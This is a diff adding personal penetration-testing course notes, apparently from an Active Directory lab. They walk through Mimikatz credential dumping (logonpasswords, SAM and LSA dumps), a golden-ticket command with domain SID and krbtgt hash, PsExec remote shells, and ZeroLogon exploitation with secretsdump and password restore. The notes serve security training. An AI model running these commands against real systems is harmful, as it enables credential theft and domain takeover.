@@ -3465,6 +3465,10 @@ IconIndex=1
 
 ### PrintNightmare (CVE-2021-1675) Walkthrough
 
+
+> [!attention] 
+> Looks like this attack is also working for Windows 10 Standalone Machines (No Domain Controll member)
+
 > [!info] 
 > Lession Info:
 >  cube0x0 RCE - [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)
@@ -3509,9 +3513,191 @@ IconIndex=1
 > 
 
 
+
+
 ### Mimikatz Overview
 
 > [!info] 
 > Resources for this video:
 > Mimikatz: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) 
+
+![[Pasted image 20230331150643.png]]
+
+> [!caution] 
+> It could be that in newer updates of Windows Mimikatz isn't working anymore. It's a mouse and cat game...
+> 
+
+
+
+### Credential Dumping with Mimikatz
+
+> [!tip] 
+>  Mimikatz Wiki is a great place to find out detailed informations:
+>  https://github.com/gentilkiwi/mimikatz/wiki
+
+> [!todo] 
+>  - Go im `cmd` to Mimikatz folder
+>  - Run `>mimikatz.exe`
+>  - `privilege::debug`
+>  - `sekurlsa::logonpasswords`
+
+![[Pasted image 20230331153245.png]]
+
+![[Pasted image 20230331153630.png]]
+
+> [!tip] 
+> We can try to pass around NTLM hash to get access somewhere 
+
+![[Pasted image 20230331153807.png]]
+
+> [!info] 
+> - `wdigest` was feature which stored password in cleartext. It's deactivated since around windows 10 or before, by default.  But feature still exists.
+> - `wdigest` can be enabled in registry
+
+> [!todo] 
+> Dump SAM:
+> `lsadump::sam` 
+> or if that failed
+> `lsadump::sam /patch`
+> otherwise use other tools like metasploit for that
+
+> [!todo] 
+> LSA - Local Security Authority
+> ` lsadump::lsa /patch` 
+
+![[Pasted image 20230331154413.png]]
+
+> [!info] 
+> Here we get usernames and `NTLM` hashes. We can try to crack them with `hashcat`.
+> 
+
+> [!tip] 
+> We can use cracked passwords to put in our report and give recomendation to our client about if his password policy is good or not.  
+
+
+### Golden Ticket Attacks
+
+> [!info] 
+> If we have username and password we can use `Ticket-Granting Ticket (TGT)` on Domain Controller.  
+
+> [!todo] 
+>  - Go im `cmd` to Mimikatz folder
+>  - Run `>mimikatz.exe`
+>  -  `privilege::debug`
+>  - `lsadump::lsa /inject /name:krbtgt`
+
+![[Pasted image 20230331173219.png]]
+
+![[Pasted image 20230331173402.png]]
+
+> [!todo] 
+>  In Mimikatz:
+>  `kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-2219376320-3670275496-2911372019 /krbtgt:fa02fc5707d4280acb4ddcec1d381a66 /id:500 /ptt`
+
+> [!question] 
+> `id` 500 is ID of Administrator 
+> `ptt` stands for pass the ticket
+
+![[Pasted image 20230331173831.png]]
+
+> [!todo] 
+>  `misc::cmd` - We have now session we created in `cmd` promt
+>  `dir \\THEPUNISHER\c$`
+
+![[Pasted image 20230331174118.png]]
+
+> [!todo] 
+> Download psexec.exe from Microsoft: https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
+> run in this `cmd` window: `>PsExec.exe \\THEPUNISHER cmd.exe` and you will have shell on that machine
+> 
+
+![[Pasted image 20230401140245.png]]
+
+
+### Conclusion and Additional Resources
+
+> [!note] 
+>  Resources for this video:
+Active Directory Security Blog: https://adsecurity.org/
+Harmj0y Blog: http://blog.harmj0y.net/
+Pentester Academy Active Directory: https://www.pentesteracademy.com/activedirectorylab
+Pentester Academy Red Team Labs: https://www.pentesteracademy.com/redteamlab
+eLS PTX: https://elearnsecurity.com/product/ecptx-certification/
+
+
+## Additional Active Directory Attacks
+
+### Abusing ZeroLogon
+
+> [!note] 
+>  Resources for this video:
+What is ZeroLogon? - https://www.trendmicro.com/en_us/what-is/zerologon.html
+dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472
+SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472
+
+> [!warning] 
+> This set Domain Controller Admin to zero. So this is maybe not recomended on pentest or at least make sure you restore password after.
+> 
+
+> [!todo] 
+> Clone  [https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472) and also [https://github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
+
+> [!todo] 
+> Test if DC is vulnerable for ZeroLogon:
+>  Go to cloned folder of `SecuraBV ZeroLogon Checker`
+>  `python3 zerologon_tester.py HYDRA-DC 192.168.203.136`
+
+![[Pasted image 20230401142404.png]]
+
+> [!warning] 
+> Better not to run acctual attack after you do that check. Just call customer and tell them to patch it.
+> 
+
+> [!todo] 
+> Run Attack in **Lab** environment:
+>  Go to cloned folder of `dirkjanm CVE-2020-1472`
+>  `python3 cve-2020-1472-exploit.py HYDRA-DC 192.168.203.136`
+
+![[Pasted image 20230401142810.png]]
+
+> [!todo] 
+> `impacket-secretsdump -just-dc MARVEL/HYDRA-DC\$@192.168.203.136`
+
+> [!done] 
+> When you get promt to put `Password`, only press enter! 
+
+![[Pasted image 20230401143024.png]]
+
+> [!todo] 
+> How to restore password:
+>  `impacket-secretsdump administrator@192.168.203.136 -hashes aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33` - Use hash of Administrator
+
+![[Pasted image 20230401143602.png]]
+
+> [!info] 
+> This info after `plain_password_hex` we use to restore password of DC:
+> `python3 restorepassword.py MARVEL/HYDRA-DC@HYDRA-DC -target-ip 192.168.203.136 -hexpass ee174e678e6460b16c3b465d04a601c803d0aca0d5c6a3aa70b57e078ec6a428ad8d0c3f10a2335e7837e3f1a6804231d60b02c1f9b6fcb0a698c4bb9ad954d18f0839b9c20a5d300249034bff0966f934b090022a4317a2f800ef7b4cb2d1bb2da0ac810a6e773181c99ba730164542f9664f8646627d44ce56b150d05970b6221e55a10da1b3612311e97a2047f74eb6a8ec94f8824c05f9461ba2065dceb02c9cfba7afd3c2f9678d5afdf0a0640f8b46d43cecb43a367b5f5afdbf139e3f8c4d347ea61b2584f6c2857bb043f6698b33905b26a036150fae41c96293a0f13cf11e3e6253d25a13851a5376804e90
+`
+
+![[Pasted image 20230401143709.png]]
+
+![[Pasted image 20230401143929.png]]
+
+
+## Post Exploitation
+
+### File Transfers Review
+
+![[Pasted image 20230401144820.png]]
+
+### Maintaining Access Overview
+
+> [!warning] 
+> Normally you don't persistence on a pentest. Only maybe `Add a User` for time of pentest.  
+
+![[Pasted image 20230401145120.png]]
+
+> [!info] 
+> Commands above from metasploit
+> 
 
